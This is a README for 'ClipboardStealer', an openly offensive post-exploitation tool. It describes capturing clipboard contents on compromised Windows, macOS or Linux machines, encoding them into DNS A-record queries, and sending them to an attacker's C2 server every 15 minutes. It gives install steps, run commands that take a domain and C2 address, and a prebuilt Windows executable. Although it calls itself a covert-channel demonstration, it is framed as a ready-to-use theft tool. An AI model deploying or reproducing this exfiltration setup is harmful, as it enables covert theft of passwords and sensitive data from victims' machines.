# ClipboardStealer

Clipboard can contain everything from passwords to possible critical data or even code snippets! It can be used post exploitation on Windows,macOS, or Linux machines
This tool is quite simple, light, and it does only one thing (so far) that is stealing whatever a compromised machine has on clipboard.
It periodically captures the contents of the clipboard, encodes the data into a DNS payload, and sends it to a command and control (C2) server. The purpose of this program is to demonstrate a covert channel for exfiltrating data using DNS queries.

## Prerequisites

You can install ClipboardStealer python requirements via:

`pip3 install -r requirements.txt`

Or you can directly use clipboardHost.exe if you're targeting Windows environment

## How does it work

The code pastes whatever is in the clipboard, encodes it, and splits it into small chunks and packs it in DNS record -type A-
it runs every 15 minutes and checks for the content of clipboard, it only sends data if the content is different from last time it was sent

On the server side, queries are parsed and payload is saved in a text file

## Usage

1. Install the required dependencies as mentioned in prerequisites

2. Run the program by executing the `client.py` script:
`python clipboard_sender.py 'domain.com' 'x.x.x.x'`

Where: 
- domain: The domain name that your queries will contain. example:
`;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40337
;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;QzovVXNlcnMvbWhtZF8v.shahin.com. IN      A`

- x.x.x.x is your C2 server

3. If you are using the .exe you can run it by running the following command:
`clipboardhost.exe example.com 8.8.8.8`

5. Now you're all set! it will continuously monitor the clipboard for changes and send the data in the clipboard to the C2 server every 15 minutes (Depending on the frequency the user updates his clipboard)
